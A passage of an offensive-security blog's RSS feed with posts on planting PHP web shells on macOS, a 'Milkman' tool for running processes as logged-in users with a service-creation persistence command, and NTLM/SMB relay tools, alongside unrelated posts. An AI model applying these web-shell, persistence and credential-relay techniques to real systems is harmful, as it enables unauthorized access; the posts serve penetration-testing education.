      <description>&lt;p&gt;As I learn more and more about OSX I find things that surprise me. For instance, in this post I will be showing you how to, &lt;strong&gt;with root or sudo priviledge&lt;/strong&gt;, enable the &lt;strong&gt;built-in&lt;/strong&gt; apache server on OSX and it&amp;rsquo;s &lt;strong&gt;PHP&lt;/strong&gt; module&amp;hellip;.&lt;/p&gt;

&lt;p&gt;I am working with OSX Mavericks so your locations may vary based on the version of OSX your target it.&lt;/p&gt;

&lt;p&gt;First things first is to enable the PHP module for the Apache server.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo nano -w /etc/apache2/httpd.conf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;em&gt;(vi or emacs to your heart&amp;rsquo;s content)&lt;/em&gt;. But what we are looking for is to uncomment the following line:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#LoadModule php5_module libexec/apache2/libphp5.so
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Once you do that, start up Apache. This can be done temporarily (won&amp;rsquo;t survive a reboot) with the &lt;code&gt;apachectl&lt;/code&gt; command:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo apachectl start
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Or you can make it more permanent with &lt;code&gt;launchctl&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And undoing the damage with:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo launchctl unload -w /System/Library/LaunchDaemons/org.apache.httpd.plist
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/osx_apache.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;After that, just drop your favorite PHP shell into the &lt;code&gt;/Library/WebServer/Documents/&lt;/code&gt; directory and you&amp;rsquo;re done. (My favorites are &lt;a href=&#34;https://github.com/b374k/b374k&#34;&gt;b374k&lt;/a&gt; and PHP Meterpreter.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/osx_php_shell.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Milkman: Creating processes as any currently logged in user</title>
      <link>http://room362.com/post/2014/2014-08-14-milkman-creating-processes-as-any-currently-logged-in-user/</link>
      <pubDate>Thu, 14 Aug 2014 00:09:21 -0400</pubDate>
      
      <guid>http://room362.com/post/2014/2014-08-14-milkman-creating-processes-as-any-currently-logged-in-user/</guid>
      <description>&lt;p&gt;One of the problems with using PSEXEC from Metasploit (any of the psexec modules) is that it runs as &lt;strong&gt;SYSTEM&lt;/strong&gt;. What&amp;rsquo;s the problem with that? Isn&amp;rsquo;t &lt;strong&gt;SYSTEM&lt;/strong&gt; god mode? Ya, and normally I&amp;rsquo;d agree that it&amp;rsquo;s the best level to have, but the defenses these days have gotten better, and getting direct connections out is pretty rare. That leaves proxies, and as you know &lt;strong&gt;SYSTEM&lt;/strong&gt; doesn&amp;rsquo;t get any proxy settings.&lt;/p&gt;

&lt;p&gt;Here is a blog post that I made &lt;a href=&#34;http://room362.com/blog/2012/10/21/setting-systems-proxy-settings-with-metasploit/&#34;&gt;about setting the proxies for SYSTEM&lt;/a&gt; but leaving settings like this set is not only sloppy but hard to clean up.&lt;/p&gt;

&lt;p&gt;Along comes &lt;code&gt;RunAsCurrentUser-2.0.3.1.exe&lt;/code&gt; I found this gem by messing up a search on google for RunAsUser. Found it &lt;a href=&#34;https://www-304.ibm.com/support/docview.wss?uid=swg21506033&#34;&gt;on this IBM support post&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201408_ibm_runascurrentuser.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Link to direct download: &lt;a href=&#34;http://software.bigfix.com/download/bes/util/RunAsCurrentUser-2.0.3.1.exe&#34;&gt;http://software.bigfix.com/download/bes/util/RunAsCurrentUser-2.0.3.1.exe&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here is a mirror uploaded to my Post Exploitation repo: &lt;a href=&#34;https://github.com/mubix/post-exploitation/blob/master/win32bins/RunAsCurrentUser-2.0.3.1.exe&#34;&gt;https://github.com/mubix/post-exploitation/blob/master/win32bins/RunAsCurrentUser-2.0.3.1.exe&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This binary takes a path to another executable as an argument. It then finds the currently logged in user and starts the provided executable as that user. AWESOME! This basically solves the whole  PSEXEC-&amp;gt;SYSTEM no-proxy settings issue. And it&amp;rsquo;s created by a legitimate company for legitimate reasons? w00tw00t. Game on!&lt;/p&gt;

&lt;p&gt;Only two problems:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;It is 335K, which doesn&amp;rsquo;t seem like much but over high latency lines that can take an eternity to transfer, especially over doubly encrypted channels like with a reverse_https meterpreter session.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;It takes an argument which normally isn&amp;rsquo;t a huge challenge, but in our specific use case, psexec modules in Metasploit, it isn&amp;rsquo;t something we can do easily. You would have to upload your C2 binary, as well as the 335K RunAsCurrentUser over to the target host, then run the psexec_command module to execute them both, one as the argument of the other. Kinda sloppy.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;So I set to try and figure out how this binary did it&amp;rsquo;s magic. As I&amp;rsquo;m not much of a reverse engineer I &lt;a href=&#34;https://www.virustotal.com/en/file/1a9b518c775e2a85a7c47801e9b8221df338a65ad8df326485e4cd2aea22fe52/analysis/&#34;&gt;uploaded it to VirusTotal&lt;/a&gt; so I could take a look at it&amp;rsquo;s insides (plus, double check to see if it was being detected as malicious at all).&lt;/p&gt;

&lt;p&gt;As far as I can tell the important pieces are the Windows API calls &lt;strong&gt;ImpersonateLoggedOnUser&lt;/strong&gt;, and &lt;strong&gt;CreateProcessAsUserA&lt;/strong&gt;. I set to trying to reproduce what it did in &lt;a href=&#34;https://www.autoitscript.com/site/autoit/&#34;&gt;AutoIT (awesome stuff if you have never checked it out)&lt;/a&gt;. I couldn&amp;rsquo;t quite get the API calls right, so I decided to give C++ a shot. Turned out to be pretty simple. I present to you &amp;ldquo;Milkman&amp;rdquo;:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://gist.github.com/mubix/5d0cacdabfe092922fa3&#34;&gt;https://gist.github.com/mubix/5d0cacdabfe092922fa3&lt;/a&gt;  &lt;strong&gt;(full source included below)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This program (once compiled) takes one argument (or none at all) and runs calc.exe for every instance of the process you tell it to. If you run it without arguments it auto selects explorer.exe. So if you create a service:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;C:\temp\&amp;gt;sc create SuperService binpath= C:\Temp\milkman.exe type= own start= auto
[SC] CreateService SUCCESS
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It will start up every time the computer starts, which is completely useless, since there won&amp;rsquo;t be any users logged in at that point, but you get where this can go. Features to add to this at point are:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Create a service binary that responds to START/STOP/PAUSE commands and such so that running this as a persistence method would actually be useful.&lt;/li&gt;
&lt;li&gt;Add a loop so that it continues to run checking for explorer.exe every so often so it can catch when someone is logged in.&lt;/li&gt;
&lt;li&gt;Finally the obvious one is to change it from being calc.exe that it runs by accepting another argument or some other kind of config option.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Thoughts? What would you like Milkman to do, or what use case do you think a tweak would make it work better for? Leave a comment below.&lt;/p&gt;

&lt;script src=&#34;https://gist.github.com/mubix/5d0cacdabfe092922fa3.js&#34;&gt;&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>The Internets Own Boy</title>
      <link>http://room362.com/post/2014/2014-07-10-the-internets-own-boy/</link>
      <pubDate>Thu, 10 Jul 2014 02:45:13 -0400</pubDate>
      
      <guid>http://room362.com/post/2014/2014-07-10-the-internets-own-boy/</guid>
      <description>&lt;p&gt;Anyone who knows me knows that I live in a tiny world of offensive security, so much so that I miss large world events entirely. (Like elections and hurricanes)&lt;/p&gt;

&lt;p&gt;I didn&amp;rsquo;t know Aaron Swartz, or even 1% of what he was doing in the world to make it a better place and for that I am ashamed. I will do better, to look around, see what needs to be changed in this world and make it a reality.&lt;/p&gt;

&lt;p&gt;The following is a Documentary about the life of Aaron Swartz. If you live under a similar rock as I, you can start here: &lt;a href=&#34;http://en.wikipedia.org/wiki/Aaron_Swartz&#34;&gt;http://en.wikipedia.org/wiki/Aaron_Swartz&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Watch, learn, share, and help continue a legacy that Aaron started.&lt;/p&gt;

&lt;iframe src=&#34;https://archive.org/embed/TheInternetsOwnBoyTheStoryOfAaronSwartz&#34; width=&#34;640&#34; height=&#34;480&#34; frameborder=&#34;0&#34; webkitallowfullscreen=&#34;true&#34; mozallowfullscreen=&#34;true&#34; allowfullscreen&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>Why good leaders make you feel safe</title>
      <link>http://room362.com/post/2014/2014-05-27-why-good-leaders-make-you-feel-safe/</link>
      <pubDate>Tue, 27 May 2014 22:31:53 -0400</pubDate>
      
      <guid>http://room362.com/post/2014/2014-05-27-why-good-leaders-make-you-feel-safe/</guid>
      <description>&lt;p&gt;This talk really touched home with me and I wanted to share it, and not just because he talked about Marines. ;-)&lt;/p&gt;

&lt;p&gt;Forward this talk on to your fellow employees, boss, etc.&lt;/p&gt;

&lt;iframe src=&#34;http://embed.ted.com/talks/simon_sinek_why_good_leaders_make_you_feel_safe.html&#34; width=&#34;560&#34; height=&#34;315&#34; frameborder=&#34;0&#34; scrolling=&#34;no&#34; webkitAllowFullScreen mozallowfullscreen allowFullScreen&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>Go home InfoSec, you&#39;re drunk</title>
      <link>http://room362.com/post/2014/2014-05-26-go-home-infosec-youre-drunk/</link>
      <pubDate>Mon, 26 May 2014 21:10:44 -0400</pubDate>
      
      <guid>http://room362.com/post/2014/2014-05-26-go-home-infosec-youre-drunk/</guid>
      <description>&lt;p&gt;Let me start off by saying this post is easy for me to write in one facet as I&amp;rsquo;ve never been a heavy drinker or much enjoyed the taste of alcohol. So if you need a reason to disregard what I say next, I leave the door open.&lt;/p&gt;

&lt;p&gt;I am still pretty much a runt in the infosec community as I didn&amp;rsquo;t even begin learning computers (outside of playing games on them) until 2005. However, one thing that has nagged at me for a long time is the intertwined nature of hacking/infosec and drinking. Its almost a right of passage in the common fraternity style. The problem lies in the fact that you don&amp;rsquo;t really &amp;ldquo;graduate&amp;rdquo; and leave those parties behind.&lt;/p&gt;

&lt;p&gt;Now, I have certainly partaken in my share of parties and consumption, even with that nagging feeling in the back of my head. It didn&amp;rsquo;t really take root until just recently. I was at a conference where a student (who was not 21) that looked very much like an older version of my oldest child said that he was going to skip dinner to go get wasted with XYZ &amp;ldquo;Infosec Rockstar&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;That scared me into thinking that if my son goes into Infosec he will be basically expected to drink like an alcoholic. How can I want my kid to be expected (not forced) to drink a shot on stage if he gets accepted to speak at DEF CON.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;We (the infosec community) are few, and we loose too many to idiotic things like drug overdose, drinking and driving, and other stupidly preventable crap&lt;/strong&gt;. For that reason I actually don&amp;rsquo;t want to share the thing I feel so passionate about with my own kids.&lt;/p&gt;

&lt;p&gt;My call to action is this:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;If you are a conference goer&lt;/strong&gt;, try going one con completely dry, and if you already do, maybe ask friend to join you.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;If you are speaker&lt;/strong&gt;, enough of the drinks on stage and drinking games. Do you really want the next generation, those you are trying to teach, to remember that part of your talk instead of the rest?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;If you are a conference organizer&lt;/strong&gt;, maybe a completely dry day at the con? or an AA meeting space?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;If you are a podcaster&lt;/strong&gt;, if you drink during the cast, make it about the taste and selection, instead of how wasted and totally useless the next hour of your listeners life will be.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ShmooCon runs an AA meeting at the con&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Lets stop losing our friends and family because we are too weak to say &amp;lsquo;no thank you&amp;rsquo; when someone approaches the dais with a shot.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Effective NTLM / SMB Relaying</title>
      <link>http://room362.com/post/2014/2014-05-21-effective-ntlm-slash-smb-relaying/</link>
      <pubDate>Wed, 21 May 2014 17:16:37 -0400</pubDate>
      
      <guid>http://room362.com/post/2014/2014-05-21-effective-ntlm-slash-smb-relaying/</guid>
      <description>

&lt;p&gt;&lt;a href=&#34;http://en.wikipedia.org/wiki/SMBRelay&#34;&gt;SMB Relay&lt;/a&gt; has been around for a long while. I even have a post about using it along with LNK files here: &lt;a href=&#34;http://room362.com/blog/2012/02/11/ms08_068-ms10_046-fun-until-2018/&#34;&gt;MS08-068 + MS10-046 = Fun until 2018&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here is the problem though. Most of the tools to exploit it either catch the authentication in NTLMv2/NTLMv1 (which is not always easy to crack) or assume administrative access (because they attempt to PSEXEC with the incoming session). Well, since MS08-068 thats much harder to pin down. You have to know who is going to hit your relay server and what other location they might be an admin on. You also have to a service you want to run on that target.&lt;/p&gt;

&lt;h3 id=&#34;current-tools:101ca14799cbfb3dc70715a9b42525cd&#34;&gt;Current Tools:&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.xfocus.net/articles/200305/smbrelay.html&#34;&gt;SMBRelay&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.tarasco.org/security/smbrelay/&#34;&gt;SMBRelay3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://github.com/SpiderLabs/Responder&#34;&gt;SpiderLabs Responder&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://corelabs.coresecurity.com/index.php?module=Wiki&amp;amp;action=view&amp;amp;type=tool&amp;amp;name=Impacket&#34;&gt;SMBRelayX in Impacket&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/server/http_ntlmrelay.rb&#34;&gt;HTTP NTLM Relay Metasploit Module&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/smb_relay.rb&#34;&gt;SMB Relay PSExec Metasploit Module&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/oracle/ora_ntlm_stealer.rb&#34;&gt;Oracle SMB Relay Metasploit Module&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/sap/sap_smb_relay.rb&#34;&gt;SAP SMB Relay Metasploit Module&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;soft-relay-tools:101ca14799cbfb3dc70715a9b42525cd&#34;&gt;&amp;ldquo;Soft&amp;rdquo; relay tools:&lt;/h3&gt;

&lt;p&gt;Now, some would argue that you just spin up the relay at a target then leave it until one pops. I&amp;rsquo;m not really a fan of that. You will not only be creating multiple access attempt log entries, but you are also just throwing away all of those user authentication attempts. There are 3 tools that agree with me.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://code.google.com/p/squirtle/&#34;&gt;Squirtle&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Squirtle is awesome plus it&amp;rsquo;s written in a language I understand (ruby) but it has one serious downfall, many of the post-auth features are left up to the user to develop. It does have a great API but needs some coding to get to do certain things.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://intercepter.nerf.ru/&#34;&gt;Intercepter-NG&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;I have tested Interceptre-NG out a lot and it has some fantastic features, not to mention that it does relaying on a Windows host, which is impressive all by itself (due to 445 default bind). My only problem with it is that it&amp;rsquo;s closed source. But definitely recommended.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The 3rd is a tool called &amp;ldquo;ZackAttack&amp;rdquo; by &lt;a href=&#34;https://twitter.com/zfasel&#34;&gt;Zack Fasel&lt;/a&gt;, you can find it here on &lt;a href=&#34;https://github.com/urbanesec/ZackAttack&#34;&gt;Github:ZackAttack&lt;/a&gt;. You can find the video of the talk releasing this tool on &lt;a href=&#34;https://www.youtube.com/watch?v=nHU3ujyw_sQ&#34;&gt;Youtube&lt;/a&gt;. So what is so special about this tool? Other than the fact that most of the web interface is broken horribly it has this amazing bit of code that acts as a SOCKS proxy. This SOCKS proxy identifies SMB or HTTP traffic that has NTLM authentication going on and rewrites it based on captured sessions.&lt;/p&gt;

&lt;p&gt;What does this mean? If I use SpiderLab&amp;rsquo;s Responder, for instance, to spoof/get/fake a bunch of users into connecting to my machine via automatic or forced methods to the capture/keep services that ZackAttack spins up, I can then run smbclient or Outlook or Web browser, push it through the ZackAttack SOCKS proxy, pick a username out of the captured names, and use any password I want when asked, and the SOCKS proxy will automatically replace it en route with the valid session information.&lt;/p&gt;

&lt;p&gt;This way I can use every authentication that comes in to its highest potential for pwnage. The video below shows how this can be used to connect to a &amp;ldquo;Network share&amp;rdquo;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update: One thing to mention that ZackAttack does that I haven&amp;rsquo;t seen other tools do, even Squirtle or Intercepter-NG is getting 3+ successful authentications out of a single relay from a user. ZackAttack does this with some clever HTTP Keep-Alive and SMB &amp;ldquo;reauth&amp;rdquo; kung fu.&lt;/strong&gt;&lt;/p&gt;

&lt;iframe width=&#34;420&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/05W5tUG7z2M&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;

&lt;h3 id=&#34;other-references:101ca14799cbfb3dc70715a9b42525cd&#34;&gt;Other References:&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://blog.spiderlabs.com/2014/02/responder-20-owning-windows-networks-part-3.html&#34;&gt;2014-02 &lt;strong&gt;SpiderLabs&lt;/strong&gt; - Responder 2.0 Owning Windows Networks Part 3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.netspi.com/blog/entryid/213/smb-attacks-through-directory-traversal&#34;&gt;2014-01 &lt;strong&gt;NetSPI Blog&lt;/strong&gt; - SMB Attacks Through Directory Traversal&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://intercepter.nerf.ru/SMB_Hijacking.Kerberos_is_defeated.pdf&#34;&gt;2013-06 &lt;strong&gt;Ares&lt;/strong&gt; - SMB Hijacking Kerberos is defeated&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://pen-testing.sans.org/blog/pen-testing/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python&#34;&gt;2013-04 &lt;strong&gt;SANS Pentesting Blog&lt;/strong&gt; - SMB Relay Demystified and NTLMv2 Pwnage with Python&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.screencast.com/users/Core_Security/folders/Training%20Videos%20for%20CORE%20Impact%20Pro/media/c48247ab-1f0b-4e86-a78a-1d7e347c0989&#34;&gt;2013-01 &lt;strong&gt;Core Security Training Video&lt;/strong&gt; - How To Perform a SMB Relay Attack&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://markgamache.blogspot.com/2013/01/ntlm-challenge-response-is-100-broken.html&#34;&gt;2013-01 &lt;strong&gt;Mark Gamache&lt;/strong&gt; - NTLM Challenge Response is 100% Broken&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.netspi.com/blog/entryid/139/executing-smb-relay-attacks-via-sql-server-using-metasploit&#34;&gt;2012-12 &lt;strong&gt;NetSPI Blog&lt;/strong&gt; - Executing SMB Relay Attacks via SQL Server using Metasploit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://webstersprodigy.net/2012/07/22/metasploit-generic-ntlm-relay-module/&#34;&gt;2012-07 &lt;strong&gt;WebstersProdigy&lt;/strong&gt; - Metasploit Generic NTLM Relay Module&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://intercepter.nerf.ru/Actuality_of_SMBRelay_in_Modern_Windows_Networks.pdf&#34;&gt;2012-04 &lt;strong&gt;Ares&lt;/strong&gt; - Actuality of SMBRelay in Modern Windows Networks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://erpscan.com/?s=smbrelay+bible&amp;amp;x=0&amp;amp;y=0&#34;&gt;2011-01 &lt;strong&gt;Digital Security Research Group Blog&lt;/strong&gt; - SMBRelay Bible&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://vimeo.com/5500931&#34;&gt;2009-07 &lt;strong&gt;Carnal0wnage&lt;/strong&gt; - Metasploit Oracle TNSCMD SMBRelay Demo&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.skullsecurity.org/2008/ms08-068-preventing-smbrelay-attacks&#34;&gt;2008-11 &lt;strong&gt;Ron Bowes&lt;/strong&gt; - Preventing SMB Relay Attacks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://squirtle.googlecode.com/files/NTLM%20is%20Dead%20-%20DefCon%2016.pdf&#34;&gt;2008-08 &lt;strong&gt;Kurt Grutzmacher at DEF CON 16&lt;/strong&gt; - NTLM is Dead!&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://heasman.blogspot.com/2008/06/stealing-password-hashes-with-java-and.html&#34;&gt;2008-06 &lt;strong&gt;John Heasman&lt;/strong&gt; - Stealing Password Hashes with Java and IE&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.powershow.com/view/28526-OWZjN/NTLM_Relay_Attacks_powerpoint_ppt_presentation&#34;&gt;2008-04 &lt;strong&gt;Eric Rachner: NTLM Relay Attacks&lt;/strong&gt; - Released tool &amp;lsquo;scurvy&amp;rsquo;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.blackhat.com/presentations/bh-usa-07/Moore_and_Valsmith/Presentation/bh-usa-07-moore_and_valsmith.pdf&#34;&gt;2007-08 &lt;strong&gt;HD Moore and Valsmith&lt;/strong&gt; - Tactical Exploitation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://web.archive.org/web/20060719183135/http://www.isecpartners.com/documents/NTLM_Unsafe.pdf&#34;&gt;2004-12 (ARCHIVE.ORG) &lt;strong&gt;Jesse Burns at SySCAN&lt;/strong&gt; - NTLM Authentication Unsafe&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.securityfriday.com/tools/ScoopLM.html&#34;&gt;2002-01 &lt;strong&gt;Azbil SecurityFriday Ltd&lt;/strong&gt; - ScoopLM&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.xfocus.net/articles/200305/smbrelay.html&#34;&gt;2001-03 &lt;strong&gt;@lantaCon&lt;/strong&gt; - Reference from &lt;strong&gt;March 31 2001 talk&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I tried finding all the original/semi original references about SMB (LM/NTLM) Relaying. If you have others please leave a comment below so I can add them to the list.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Installing PyCrypto on OSX Mavericks</title>
      <link>http://room362.com/post/2014/2014-05-21-installing-pycrypto-on-mavericks/</link>
      <pubDate>Wed, 21 May 2014 11:12:42 -0400</pubDate>
      
      <guid>http://room362.com/post/2014/2014-05-21-installing-pycrypto-on-mavericks/</guid>
      <description>&lt;p&gt;Keeping it here for notes and just in case anyone else runs into this same issue.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;brew install pip
sudo ARCHFLAGS=-Wno-error=unused-command-line-argument-hard-error-in-future pip install pycrypto
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you have a better way please leave a comment below!&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>